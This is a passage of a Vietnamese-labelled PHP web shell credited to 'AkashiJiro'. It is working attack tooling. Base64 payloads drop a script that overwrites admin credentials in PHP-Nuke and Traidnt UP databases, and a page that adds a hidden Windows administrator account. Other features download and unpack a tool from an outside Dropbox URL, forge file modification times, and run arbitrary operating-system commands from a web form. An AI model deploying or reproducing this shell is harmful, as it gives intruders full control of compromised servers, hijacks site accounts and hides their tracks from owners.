ZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBQSFAtTlVLRSBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluLnBocDxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vY29uZmlnLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmhwbmsgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXBocG51a2UgdHlwZT10ZXh0IG5hbWU9ZGJucG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHVzZXI8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1yb290IHR5cGU9dGV4dCBuYW1lPWRidXBuayBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnBwbmsgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVycG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBwYXNzd29yZCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT1wYXNzd29yZCBuYW1lPXBzcG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW51a2VfIHR5cGU9dGV4dCBuYW1lPXBycG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHBuayA9ICRfUE9TVFsnZGJocG5rJ107CiRkYm5wbmsgID0gJF9QT1NUWydkYm5wbmsnXTsKJGRidXBuayA9ICRfUE9TVFsnZGJ1cG5rJ107CiRkYnBwbmsgID0gJF9QT1NUWydkYnBwbmsnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHBuaywkZGJ1cG5rLCRkYnBwbmspOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5wbmspOwoKJHVycG5rPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnBuayk7CiRzZXRfdXJwbmsgPSAkX1BPU1RbJ3VycG5rJ107CgokcHNwbms9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHBzcG5rKTsKJHBhc3NfcG5rID0gJF9QT1NUWydwc3BuayddOwokc2V0X3BzcG5rID0gbWQ1KCRwYXNzX3Buayk7CgokcG5rX3ByZWZpeCA9ICRfUE9TVFsncHJwbmsnXTsKCiR0YWJsZV9uYW1lNiA9ICRwbmtfcHJlZml4LiJ1c2VycyIgOwokdGFibGVfbmFtZTcgPSAkcG5rX3ByZWZpeC4iYXV0aG9ycyIgOwoKJGxlY29uZ3RoaWVuMTUgPSAiVVBEQVRFICR0YWJsZV9uYW1lNiBTRVQgdXNlcm5hbWUgPSciLiRzZXRfdXJwbmsuIicgV0hFUkUgdXNlcl9pZCA9JzInIjsKJGxlY29uZ3RoaWVuMTYgPSAiVVBEQVRFICR0YWJsZV9uYW1lNiBTRVQgdXNlcl9wYXNzd29yZCA9JyIuJHNldF9wc3Buay4iJyBXSEVSRSB1c2VyX2lkID0nMiciOwoKJGxlY29uZ3RoaWVuMTcgPSAiVVBEQVRFICR0YWJsZV9uYW1lNyBTRVQgYWlkID0nIi4kc2V0X3VycG5rLiInIFdIRVJFIHJhZG1pbnN1cGVyID0nMSciOwokbGVjb25ndGhpZW4xOCA9ICJVUERBVEUgJHRhYmxlX25hbWU3IFNFVCBwd2QgPSciLiRzZXRfcHNwbmsuIicgV0hFUkUgcmFkbWluc3VwZXIgPScxJyI7Cgokb2s4PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xNSk7CiRvazg9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjE2KTsKJG9rOD1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTcpOwokb2s4PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xOCk7CgppZigkb2s4KXsKZWNobyAiPHNjcmlwdD5hbGVydCgnUEhQLU5VS0UgdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9UcmFpZG50IFVQCmlmIChpc3NldCgkX1BPU1RbJ3VwJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBUcmFpZG50IFVQIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vdXBsb2FkY3A8YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2luY2x1ZGVzL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJodXAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXVwbG9hZCB0eXBlPXRleHQgbmFtZT1kYm51cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnB1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJ1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3VwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHVwID0gJF9QT1NUWydkYmh1cCddOwokZGJudXAgID0gJF9QT1NUWydkYm51cCddOwokZGJ1dXAgPSAkX1BPU1RbJ2RidXVwJ107CiRkYnB1cCAgPSAkX1BPU1RbJ2RicHVwJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh1cCwkZGJ1dXAsJGRicHVwKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJudXApOwoKJHVydXA9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVydXApOwokc2V0X3VydXAgPSAkX1BPU1RbJ3VydXAnXTsKCiRwc3VwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3VwKTsKJHBhc3NfdXAgPSAkX1BPU1RbJ3BzdXAnXTsKJHNldF9wc3VwID0gbWQ1KCRwYXNzX3VwKTsKCiRsZWNvbmd0aGllbjE5ID0gIlVQREFURSBhZG1pbiBTRVQgYWRtaW5fdXNlciA9JyIuJHNldF91cnVwLiInIFdIRVJFIGFkbWluX2lkID0nMSciOwokbGVjb25ndGhpZW4yMCA9ICJVUERBVEUgYWRtaW4gU0VUIGFkbWluX3Bhc3N3b3JkID0nIi4kc2V0X3BzdXAuIicgV0hFUkUgYWRtaW5faWQgPScxJyI7Cgokb2s5PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xOSk7CiRvazk9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjIwKTsKCmlmKCRvazkpewplY2hvICI8c2NyaXB0PmFsZXJ0KCdUcmFpZG50IFVQIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KLy9FTkQKPz4K
';
$file = fopen("change-pas.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
   echo "<iframe src=change-pas.php width=100% height=720px frameborder=0></iframe> ";	
}//end change pas

elseif ($action == 'reverseip') {
	    @exec('wget http://dl.dropbox.com/u/74425391/ip.tar.gz');
        @exec('tar -xvf ip.tar.gz');
   echo "<iframe src=ip/index.php width=100% height=720px frameborder=0></iframe> ";
}//end shell reverseip 

elseif ($action == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
	formfooter();
}//end editfile

elseif ($action == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	formhead(array('title'=>'Clone file was last modified time'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Set last modified'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('year:');
	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
}//end newtime
    elseif ($action == 'symroot') {
$file = fopen($dir."win1.php" ,"w+");
$perltoolss = 'PGh0bWw+DQo8aGVhZD4NCjwvc2NyaXB0Pg0KPHRpdGxlPi0tPT1bW0jDoG0gTOG7h25oIEhhY2sgVXNlciBBRE1JTlNUUkFUT1IgVlBTXV09PS0tPC90aXRsZT4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCg0KPFNUWUxFPg0KYm9keSB7DQpmb250LWZhbWlseTogVGFob21hDQp9DQp0ciB7DQpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsNCmNvbG9yOiAjRkZGOw0KfQ0KdGQgew0KQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7DQpjb2xvcjogI0ZGRjsNCn0NCi50YWJsZTEgew0KQk9SREVSOiAwcHggQmxhY2s7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmNvbG9yOiAjRkZGOw0KfQ0KLnRkMSB7DQpCT1JERVI6IDBweDsNCkJPUkRFUi1DT0xPUjogIzMzMzMzMzsNCmZvbnQ6IDdwdCBWZXJkYW5hOw0KY29sb3I6IEdyZWVuOw0KfQ0KLnRyMSB7DQpCT1JERVI6IDBweDsNCkJPUkRFUi1DT0xPUjogIzMzMzMzMzsNCmNvbG9yOiAjRkZGOw0KfQ0KdGFibGUgew0KQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7DQpCT1JERVItQ09MT1I6ICMzMzMzMzM7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmNvbG9yOiAjRkZGOw0KfQ0KaW5wdXQgew0KYm9yZGVyCQkJOiBkYXNoZWQgMXB4Ow0KYm9yZGVyLWNvbG9yCQk6ICMzMzM7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDhwdCBWZXJkYW5hOw0KY29sb3I6IFJlZDsNCn0NCnNlbGVjdCB7DQpCT1JERVItUklHSFQ6ICBCbGFjayAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjREYwMDAwIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICNERjAwMDAgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogQmxhY2sgMXB4IHNvbGlkOw0KQk9SREVSLWNvbG9yOiAjRkZGOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpmb250OiA4cHQgVmVyZGFuYTsNCmNvbG9yOiBSZWQ7DQp9DQpzdWJtaXQgew0KQk9SREVSOiAgYnV0dG9uaGlnaGxpZ2h0IDJweCBvdXRzZXQ7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCndpZHRoOiAzMCU7DQpjb2xvcjogI0ZGRjsNCn0NCnRleHRhcmVhIHsNCmJvcmRlcgkJCTogZGFzaGVkIDFweCAjMzMzOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICM5OTk7DQp9DQpCT0RZIHsNCglTQ1JPTExCQVItRkFDRS1DT0xPUjogQmxhY2s7IFNDUk9MTEJBUi1ISUdITElHSFQtY29sb3I6ICNGRkY7IFNDUk9MTEJBUi1TSEFET1ctY29sb3I6ICNGRkY7IFNDUk9MTEJBUi0zRExJR0hULWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItQVJST1ctQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItVFJBQ0stY29sb3I6ICNGRkY7IFNDUk9MTEJBUi1EQVJLU0hBRE9XLWNvbG9yOiAjRkZGDQptYXJnaW46IDFweDsNCmNvbG9yOiBSZWQ7DQpiYWNrZ3JvdW5kLWNvbG9yOiBCbGFjazsNCn0NCi5tYWluIHsNCm1hcmdpbgkJCTogLTI4N3B4IDBweCAwcHggLTQ5MHB4Ow0KQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7DQpCT1JERVItQ09MT1I6ICMzMzMzMzM7DQp9DQoudHQgew0KYmFja2dyb3VuZC1jb2xvcjogQmxhY2s7DQp9DQoNCkE6bGluayB7DQoJQ09MT1I6IFdoaXRlOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6IFdoaXRlOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6aG92ZXIgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KPC9TVFlMRT4NCjxzY3JpcHQgbGFuZ3VhZ2U9XCdqYXZhc2NyaXB0XCc+DQpmdW5jdGlvbiBoaWRlX2RpdihpZCkNCnsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLnN0eWxlLmRpc3BsYXkgPSBcJ25vbmVcJzsNCiAgZG9jdW1lbnQuY29va2llPWlkK1wnPTA7XCc7DQp9DQpmdW5jdGlvbiBzaG93X2RpdihpZCkNCnsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLnN0eWxlLmRpc3BsYXkgPSBcJ2Jsb2NrXCc7DQogIGRvY3VtZW50LmNvb2tpZT1pZCtcJz0xO1wnOw0KfQ0KZnVuY3Rpb24gY2hhbmdlX2RpdnN0KGlkKQ0Kew0KICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLnN0eWxlLmRpc3BsYXkgPT0gXCdub25lXCcpDQogICAgc2hvd19kaXYoaWQpOw0KICBlbHNlDQogICAgaGlkZV9kaXYoaWQpOw0KfQ0KPC9zY3JpcHQ+DQo8aHRtbD4NCgk8aGVhZD4NCgkJPD9waHAgDQoJCWVjaG8gJGhlYWQgOw0KCQllY2hvICcNCg0KPHRhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIGNsYXNzPSJ0YjEiID4NCg0KCQkJDQoNCiAgICAgICA8dGQgd2lkdGg9IjEwMCUiIGFsaWduPWNlbnRlciB2YWxpZ249InRvcCIgcm93c3Bhbj0iMSI+DQogICAgICAgICAgIDxmb250IGNvbG9yPXJlZCBzaXplPTUgZmFjZT0iY29taWMgc2FucyBtcyI+PGI+PT1bWyBIxrDhu5tuZyBk4bqrbiBSZWcgTmljayBBRE1JTlNUUkFUT1I8L2ZvbnQ+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT01IGZhY2U9ImNvbWljIHNhbnMgbXMiPjxiPiBWUFMgPC9mb250Pjxmb250IGNvbG9yPWdyZWVuIHNpemU9NSBmYWNlPSJjb21pYyBzYW5zIG1zIj48Yj4gQuG6sW5nIEPDoWNoIETDuW5nIENNRF1dPT08L2ZvbnQ+IDxkaXYgY2xhc3M9ImhlZHIiPiANCg0KICAgICAgICA8dGQgaGVpZ2h0PSIxMCIgYWxpZ249ImxlZnQiIGNsYXNzPSJ0ZDEiPjwvdGQ+PC90cj48dHI+PHRkIA0KICAgICAgICB3aWR0aD0iMTAwJSIgYWxpZ249ImNlbnRlciIgdmFsaWduPSJ0b3AiIHJvd3NwYW49IjEiPjxmb250IA0KICAgICAgICBjb2xvcj0icmVkIiBmYWNlPSJjb21pYyBzYW5zIG1zInNpemU9IjEiPjxiPiANCiAgICAgICAgCQkJCQkNCiAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgDQoNCic7IA0KDQo/Pg0KPGNlbnRlcj4NCjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPSJjb21pYyBzYW5zIG1zIj4xLiBDaOG7jW4gdMOtbmggbsSDbmcgW1sgQ01EIF1dIHRyw6puIHNoZWxsPC9mb250PjxwPg0KPGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPi0tQsaw4bubYyAxOiB04bqhbyB1c2VyIHRyw6puIFZQUzwvZm9udD48cD4NCjxpbnB1dCB0eXBlPWJ1dHRvbiBuYW1lPWluaSB2YWx1ZT0ibmV0IHVzZXIgYWthamlybyBqaXJvYWthIC9BREQgIiAvPg0KPGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPiogVHJvbmcgxJHDsyBqaXJvYWthIGzDoCBUw6BpIEtob+G6o24gLSBDw7JuIGppcm9ha2EgbMOgIG3huq10IGto4bqpdSB0cnV5IGPhuq1wIHZwczwvZm9udD48cD4NCjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPSJjb21pYyBzYW5zIG1zIj4tLULGsOG7m2MgMjogdGjDqm0gdXNlciB24burYSB04bqhbyB2w6BvIGdyb3VwIGFkbWluPC9mb250PjxwPg0KPGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPg0KPGlucHV0IHR5cGU9YnV0dG9uIG5hbWU9aW5pIHZhbHVlPSJuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyBha2FqaXJvIC9BREQiIC8+PC9mb250PjxwPg0KPGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPiogTuG6v3UgWHXhuqV0IEhp4buHbiBUaMO0bmcgQsOhbyAiIFRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuICAiIEzDoCBUaMOgbmggQ8O0bmc8L2ZvbnQ+PHA+CQ0KPC9jZW50ZXI+CQ==
';
$file = fopen("win1.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
   echo "<iframe src=win1.php width=100% height=720px frameborder=0></iframe> ";
}//end viewfile 
if ($action == 'shell') {
	formhead(array('title'=>'Chức năng dành cho hacker sử dụng CMD'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'Hacker');
		makeselect(array('title'=>'Lựa Chọn:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Nhập Lệnh','name'=>'command','value'=>$command));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Thực Hiện'));
	p('</p>');
	formfoot();

	if ($command) {
		p('<hr width="100%" noshade /><pre>');
		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$command);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if (is_resource($process)) {
				fwrite($pipes[0], $command."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(execute($command));
		}
		p('</pre>');
	}
}//end shell

?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
	<center><span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
	Copyright @ 2013 By: AkashiJiro<a href=https://www.facebook.com/groups/HoihackerVN/ target=_blank><B>  .:: VHG - CEH - ANBU::.   </B></a><center>
</div>
</body>
</html>
<?php
/*======================================================
Show info shell
======================================================*/
function m($msg) {
	echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
	echo $msg;
	echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $admin, $timestamp, $_SERVER;
	$key = ($prefix ? $admin['cookiepre'] : '').$key;
	$life = $life ? $life : $admin['cookielife'];
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num > $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page > $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from < 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$to = $page;
				}
			} elseif($to > $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
